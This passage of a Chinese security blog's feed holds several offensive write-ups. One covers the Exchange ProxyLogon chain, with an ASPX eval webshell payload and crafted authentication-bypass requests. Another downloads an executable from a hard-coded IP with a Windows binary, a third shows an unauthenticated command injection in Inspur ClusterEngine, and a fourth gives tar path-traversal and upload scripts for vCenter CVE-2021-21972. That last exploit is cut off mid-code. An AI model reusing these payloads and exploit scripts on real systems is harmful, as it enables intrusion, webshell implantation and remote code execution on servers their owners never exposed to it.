class="hljs-name">AcceptableResponseSchema</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Request</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Autodiscover</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210320140812666.png" alt="image-20210320140812666"></p><p>这里会返回OABUrl，然后访问oaburl/oab.xml，会返回lzx文件地址</p><p><img src="/img/article2/image-20210320141322991.png" alt="image-20210320141322991"></p><p>直接访问lzx文件地址可以获得该内容</p><p><img src="/img/article2/image-20210320141446901.png" alt="image-20210320141446901"></p><p>使用 <a href="https://github.com/kyz/libmspack">oabextract</a> 工具可还原地址列表</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">oabextract 4667c322-5c08-4cda-844a-253ff36b4a6a-data-5.lzx gal.oab<br><br>strings gal.oab|grep SMTP<br></code></pre></td></tr></table></figure><h2 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h2></li></ul><p>Windows提供的针对该漏洞的日志检测</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:PROGRAMFILES</span>\Microsoft\ExchangeServer\V15\Logging\ECP\Server\*.log&quot;</span> `<br><span class="hljs-literal">-Pattern</span> <span class="hljs-string">&#x27;Set-.+VirtualDirectory&#x27;</span><br></code></pre></td></tr></table></figure><p>下面是SSRF漏洞的又一个危险的利用，攻击者可以利用该漏洞在exchange服务器上任意位置写入文件。并且可以部分控制写入内容，这就提供了一个完成RCE的全部条件。</p><p>根据上述的检测方式，可以发现，该RCE利用了虚拟目录的功能。通过对比补丁，发现是<code>Microsoft.Exchange.Management.ControlPanel.DIService</code> 中 <code>WriteFileActivity</code></p><p> 类的变化。</p><p><img src="https://www.praetorian.com/wp-content/uploads/2021/03/patch-diff-write-file-activity-image-1-1024x621.png" alt="img"></p><p>很明显，改动后强制了文件后缀为 ‘txt’ ,这就说明，可以通过修改路径为 web目录 + .aspx 来写入webshell。</p><p>这里其实是邮箱管理员用户的一个功能，即修改存储oab虚拟目录设置的文件的位置。而这里并没有校验文件的后缀名与路径。</p><p><img src="https://miro.medium.com/max/815/1*llRyLMy7JezOmw6MNno_NQ.png" alt="img"></p><p>而通过虚拟目录设置中的 <code>外部url</code> 和 <code>内部url</code> 参数，可以达到在该文件中，写入任意内容。</p><p><img src="https://www.praetorian.com/wp-content/uploads/2021/03/virtual-directory-image-1-1024x762.png" alt="img"></p><p>虽然服务端对提交的url参数进行了url路径格式验证，但我们仍可以通过前面设置路由或者参数的方式，绕过该验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">http:&#x2F;&#x2F;o&#x2F;#&lt;script language&#x3D;&quot;JScript&quot; runat&#x3D;&quot;server&quot;&gt;function Page_Load()&#123;eval(Request[&quot;mlwqloai&quot;],&quot;unsafe&quot;);&#125;&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure><h3 id="仍然要绕过的认证"><a href="#仍然要绕过的认证" class="headerlink" title="仍然要绕过的认证"></a>仍然要绕过的认证</h3><p>现在我们拥有了一个写入漏洞的攻击路径，只需要能绕过ecp端的认证即可成功操作虚拟目录，写入文件。</p><p>于是我们想到了之前拥有的SSRF漏洞。但是不幸的是，普通的ecp端口的访问时经过\owa\auth的认证，相当于走的web端的认证，并不是走的票据认证，于是简单的将请求relay到ecp接口是行不通的，仍会跳转到owa的登录页。于是问题变成了，能不能找到一个可以通过ecp认证的地方。</p><p>通过翻找日志，我们发现了这样的请求</p><p><img src="/img/article2/image-20210320150337591.png" alt="image-20210320150337591"></p><p>我们发现了攻击者请求了ecp下的一个接口，叫做 <strong><em>/ecp/proxyLogon.ecp</em></strong> ，这一刻，我终于明白了这个漏洞名字的由来（哭了）</p><p>于是经过一波和大佬们的讨论已经网上的文章，终于理清了这个神秘的任意文件写入漏洞的完整利用。</p><p>在ecp目录下的web.config中定义了对proxyLogon.ecp的调用方式</p><p><img src="https://miro.medium.com/max/1671/1*Km3bFzJ08gfn5KafyyJ-0g.png" alt="img"></p><p><img src="https://miro.medium.com/max/1778/1*F-nuiwyYKLUBSGLAFMN-Iw.png" alt="img"></p><p>后端将请求的参数进行序列化，并联合三个头部参数：<code>msExchLogonAccount</code> 、<code>msExchLogonMailbox</code> 、<code>MsExchTargetMailbox</code> 进行验证。</p><p>通过学习网上的歪果大师傅的文章，他构造出了可以通过验证的请求内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">r</span> <span class="hljs-attr">at</span>=<span class="hljs-string">&quot;Negotiate&quot;</span> <span class="hljs-attr">ln</span>=<span class="hljs-string">&quot;john&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">s</span>&gt;</span>sid<span class="hljs-tag">&lt;/<span class="hljs-name">s</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而那三个头部，通过代码里的表示，应该是标识邮箱的sid，其实当你在autodiscover端登录成功时，就会返回给你这个标识</p><p><img src="/img/article2/image-20210320153241885.png" alt="image-20210320153241885"></p><p>然后服务端会给通过验证的请求，设置session。</p><p><img src="/img/article2/image-20210320154931598.png" alt="image-20210320154931598"></p><p>我们成功获得了返回的sessionid和Canary！</p><p>然后就可以直接利用此凭据，去请求操作oad的接口,以下是修改filename的数据包</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dts">POST <span class="hljs-meta-keyword">/ecp/</span>DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory<span class="hljs-variable">&amp;</span>msExchEcpCanary=&#123;csrf&#125; HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-symbol">Host:</span> localhost<br><span class="hljs-symbol">Cookie:</span> msExchEcpCanary=&#123;csrf&#125;;<br>Content-Type: application/json<br>&#123;<br>  <span class="hljs-string">&quot;identity&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;Identity:ECP&quot;</span>,<br>    <span class="hljs-string">&quot;DisplayName&quot;</span>: <span class="hljs-string">&quot;OAB (Default Web Site)&quot;</span>,<br>    <span class="hljs-string">&quot;RawIdentity&quot;</span>: <span class="hljs-string">&quot;cf64594f-d739-44a4-aa70-3fbd158625e2&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;Parameters&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,<br>      <span class="hljs-string">&quot;FilePathName&quot;</span>: <span class="hljs-string">&quot;C:\\VirtualDirectory.aspx&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的oabid可以通过以下数据包获得</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&#123;<br><span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;Parameters&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>:       <span class="hljs-string">&quot;JsonDictionaryOfanyType:<span class="hljs-subst">#Microsoft</span>.Exchange.Management.ControlPanel&quot;</span>,<br>    <span class="hljs-string">&quot;SelectedView&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;SelectedVDirType&quot;</span>: <span class="hljs-string">&quot;All&quot;</span>&#125;<br>    &#125;, <br>    <span class="hljs-string">&quot;sort&quot;</span>: &#123;&#125;<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="获得sid"><a href="#获得sid" class="headerlink" title="获得sid"></a>获得sid</h3><p>而通过ecp的认证需要获得用户的sid，sid标识着域内的每一个用户，那要怎么获得他呢。通过之前的日志看到，攻击者回去请求 autodiscover 和 mapi 两个接口。根据网上师傅们的文章，得知：</p><ul><li><p>通过对mapi接口请求，其报错中会返回sid</p><p><img src="https://miro.medium.com/max/1806/1*8GKi6vKmcuSZmjnYWXX_UQ.png" alt="img"></p></li><li><p>而请求的内容由之前请求的autodiscover返回数据中的 <code>&lt;LegacyDN&gt;</code> 标签内的数据组成。</p></li><li><p>注：对mapi接口的请求，需要加上</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;X-Requesttype&#x27;: &#x27;Connect&#x27;,<br>&#x27;X-Requestid&#x27;: &#x27;&#123;CD123DD3-2CD3-45G5-BF34-<span class="hljs-number">2345676543</span>V5&#125;:2&#x27;,<br>&#x27;X-Clientapplication&#x27;: &#x27;Outlook/15.0.<span class="hljs-number">1473.1002</span>&#x27;,<br>&#x27;X-Clientinfo&#x27;: &#x27;&#123;2F94A2BF-A2E6-4CCC-BF98-B5F22C<span class="hljs-number">542226</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>这几个头部参数（id和info里面的内容应该是随机的，所以并不影响）</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用Imewdbld下载文件</title>
    <link href="/2021/03/05/imewdbld/"/>
    <url>/2021/03/05/imewdbld/</url>
    
    <content type="html"><![CDATA[<h1 id="Using-Imewdbld-to-Download"><a href="#Using-Imewdbld-to-Download" class="headerlink" title="Using Imewdbld to Download"></a>Using Imewdbld to Download</h1><p>一种下载文件的方式</p><p><img src="/img/article2/image-20210305104938086.png" alt="image-20210305104938086"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://47.75.197.183/ss/Rar.exe<br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105008540.png" alt="image-20210305105008540"></p><p>下载目录为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>NetCache<span class="hljs-symbol">\&lt;</span>8_RANDOM_ALNUM_CHARS&gt;/&lt;FILENAME&gt;[1].&lt;EXTENSION&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105023927.png" alt="image-20210305105023927"></p><p>下载后的文件和文件夹是隐藏的，即使开启 “打开隐藏” 也是不会在exploer里面现实的，但是可以使用命令查找路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">forfiles /P <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span> /S /M * /C <span class="hljs-string">&quot;cmd /c echo </span><br><span class="hljs-string">@path&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105236738.png" alt="image-20210305105236738"></p><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dir /s <span class="hljs-string">&quot;%localappdata%\Microsoft\Windows\INetCache&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article2/image-20210305105301019.png" alt="image-20210305105301019"></p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后渗透</tag>
      
      <tag>Tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浪潮clusterengine 未授权RCE</title>
    <link href="/2021/03/02/TSCE/"/>
    <url>/2021/03/02/TSCE/</url>
    
    <content type="html"><![CDATA[<h1 id="浪潮clusterengine-未授权RCE"><a href="#浪潮clusterengine-未授权RCE" class="headerlink" title="浪潮clusterengine 未授权RCE"></a>浪潮clusterengine 未授权RCE</h1><p>浪潮clusterengine是浪潮HPC的管理端，是许多大型厂商内部的重要的集群管理软件。</p><p>经测试，该系统内部存在诸多未授权接口，可导致任意命令执行</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p>命令执行</p><p>在底层定义的 <code>ExecuteUtil</code> 类中，构造了命令执行接口（就很离谱），对 <code>cmd</code> 参数并没有做过滤直接拼接到 <code>/bin/sh</code> 语句中，调用<code>java.lang.runtime.getruntime()</code> 直接执行（更加离谱） </p><p><img src="/img/article2/image-20210302153016702.png" alt="命令执行"></p></li><li><p>查找调用链</p><p>全局搜索 <code>doCommand</code> 方法，发现存在大量接口调用，随意选择了第一个包 <code>accountMgr</code> 中的 <code>Command</code> 类，发现在 <code>getuserjobs</code> 方法中调用该方法。</p><p><img src="/img/article2/image-20210302154101078.png" alt="第一处调用"></p><p>该方法将传入的参数直接拼接在构造的命令语句后也并无过滤，那我们可以继续往前追这个方法</p><p>发现 <code>getBillDetail</code> 调用了该方法，且也是直接传入参数并未过滤</p><p><img src="/img/article2/image-20210302154515348.png" alt="上一处调用"></p><p>接着进入 <code>Management</code> 类，发现是通过传入的 <code>operation</code> 参数来判断执行什么方法。</p><p><img src="/img/article2/image-20210302160330567.png" alt="在上一处"></p><p><img src="/img/article2/image-20210302160345043.png" alt="image-20210302160345043"></p><p>最后在 <code>Management</code> 类定义的 <code>getBillDetail</code> 方法中，发现该方法直接调用了传入的参数，并传入command类定义的 <code>getBillDetail</code> 方法中</p><p><img src="/img/article2/image-20210302174241509.png" alt="last"></p><p>可以看到这个方法在 <code>doResponse</code> 调用，追一下发现最终在 <code>servlet</code> 类中调用这个方法</p><p><img src="/img/article2/image-20210302215036192.png" alt="image-20210302215036192"></p><p>根据标记是 <code>acctMgrSerlvet</code> 接口</p><p><img src="/img/article2/image-20210302215202008.png" alt="image-20210302215202008"></p></li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>调用链很清晰，后端接收了前端传入的参数后最终拼接在底层的 <code>executeutil</code> 模板中的命令执行参数里，并且接收参数并没有做过滤。</p><p>那通过该接口拼接参数，通过 <code>&amp;</code> 闭合，即可造成rce</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>构造参数即可</p><p><img src="/img/article2/image-20210302220212590.png" alt="image-20210302220212590"></p><p><img src="/img/article2/image-20210302220100458.png" alt="image-20210302220100458"></p><p>经检测存在不止一个接口未授权rce</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Exp</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-21972</title>
    <link href="/2021/02/25/vcenter_rce/"/>
    <url>/2021/02/25/vcenter_rce/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h1><p>vcenter server的 <code>vROPS</code> 插件存在未授权接口，其中 <code>uploadova</code> 接口允许上传ova模板文件，但是并未对文件进行类型判断</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/uploadova&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uploadOvaFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;uploadFile&quot;,required = true)</span> CommonsMultipartFile uploadFile, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        logger.info(<span class="hljs-string">&quot;Entering uploadOvaFile api&quot;</span>);<br>        <span class="hljs-keyword">int</span> code = uploadFile.isEmpty() ? <span class="hljs-number">400</span> : <span class="hljs-number">200</span>;<br>        PrintWriter wr = <span class="hljs-keyword">null</span>;<br>...<br>        response.setStatus(code);<br>        String returnStatus = <span class="hljs-string">&quot;SUCCESS&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!uploadFile.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;Downloading OVA file has been started&quot;</span>);<br>                logger.info(<span class="hljs-string">&quot;Size of the file received  : &quot;</span> + uploadFile.getSize());<br>                InputStream inputStream = uploadFile.getInputStream();<br>                File dir = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>);<br>                <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>                    dir.mkdirs();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    String[] entries = dir.list();<br>                    String[] var9 = entries;<br>                    <span class="hljs-keyword">int</span> var10 = entries.length;<br><br>                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123;<br>                        String entry = var9[var11];<br>                        File currentFile = <span class="hljs-keyword">new</span> File(dir.getPath(), entry);<br>                        currentFile.delete();<br>                    &#125;<br><br>                    logger.info(<span class="hljs-string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);<br>                &#125;<br><br>                TarArchiveInputStream in = <span class="hljs-keyword">new</span> TarArchiveInputStream(inputStream);<br>                TarArchiveEntry entry = in.getNextTarEntry();<br>                ArrayList result = <span class="hljs-keyword">new</span> ArrayList();<br></code></pre></td></tr></table></figure><p>servlet直接匹配 <code>/uploadova</code> 接口，检查请求数据包含的 <code>uploadFile</code> 参数，上传成功返回’SUCCESS’，将临时文件置空并解包tar文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(entry != <span class="hljs-keyword">null</span>) &#123;<br>                  <span class="hljs-keyword">if</span> (entry.isDirectory()) &#123;<br>                      entry = in.getNextTarEntry();<br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                      File curfile = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>, entry.getName());<br>                      File parent = curfile.getParentFile();<br>                      <span class="hljs-keyword">if</span> (!parent.exists()) &#123;<br>                          parent.mkdirs();<br></code></pre></td></tr></table></figure><p>这里将分解的tar文件直接拼接在了 <code>/tmp/unicorn_ova_dir</code> 目录后面，若解压后的文件包含 <code>../</code> 则可造成目录穿越。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>构造包含 <code>../</code> 的tar文件，通过未授权接口 <code>uploadova</code> 上传。</p><ul><li><strong><em>linux</em></strong>：内网机器可以直接构造 <code>../../home/vsphere-ui/.ssh/authorized_keys</code> 写入公钥</li><li><strong><em>windows</em></strong>：写入webshell。</li></ul><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>访问 <a href="https://ip/ui/vropspluginui/rest/services/uploadova">https://ip/ui/vropspluginui/rest/services/uploadova</a> 返回405既证明漏洞存在。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="构造含有回溯符的tar文件"><a href="#构造含有回溯符的tar文件" class="headerlink" title="构造含有回溯符的tar文件"></a>构造含有回溯符的tar文件</h3><p>可以利用python的 <code>tarfile</code> 库文件</p><ul><li><p><strong><em>windows</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br>tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.war&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>tf.add(<span class="hljs-string">&#x27;123.jsp&#x27;</span>,<span class="hljs-string">&#x27;..\\..\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-ui\\server\\work\\deployer\s\\global\\40\\0\\h5ngc.war\\resources\\123.jsp&#x27;</span>)<br>tf.close()<br></code></pre></td></tr></table></figure></li><li><p><strong><em>linux</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br>tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.war&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>tf.add(<span class="hljs-string">&#x27;123.jsp&#x27;</span>,<span class="hljs-string">&#x27;../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/123.jsp&#x27;</span>)<br>tf.close()<br></code></pre></td></tr></table></figure><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3></li></ul><p>我测试的时候直接构造的html上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;vcenter_rce&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://xxx/ui/vropspluginui/rest/services/uploadova&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100000&quot;</span>&gt;</span><br>Choose an image to upload:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;uploadFile&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Upload&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>python也很方便，调用上传文件的接口即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> sys<br><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>files = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload/Linux.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125; <br>url1 = url + <span class="hljs-string">&#x27;/ui/vropspluginui/rest/services/uploadova&#x27;</span><br>url2 = url + <span class="hljs-string">&#x27;/ui/resources/test1.jsp&#x27;</span><br><br><span class="hljs-keyword">try</span>:<br>    a = requests.post(url1,files=files,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> a.status_code ==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;SUCCESS&#x27;</span> <span class="hljs-keyword">in</span> a.content:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] upload success&#x27;</span><br>        <span class="hljs-keyword">if</span> requests.get(url2,verify=<span class="hljs-literal">False</span>).status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] exploited&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br></code></pre></td></tr></table></figure><p><strong><em>webshell的地址只针对默认的vsac，并不通配，所以上传吼请求一下判断是否上传成功</em></strong></p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> tarfile<br><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>file_in = sys.argv[<span class="hljs-number">2</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_tar</span>(<span class="hljs-params">file_in</span>):</span><br>    <span class="hljs-comment"># windows_shell</span><br>    tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;win.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    tf.add(file_in,<span 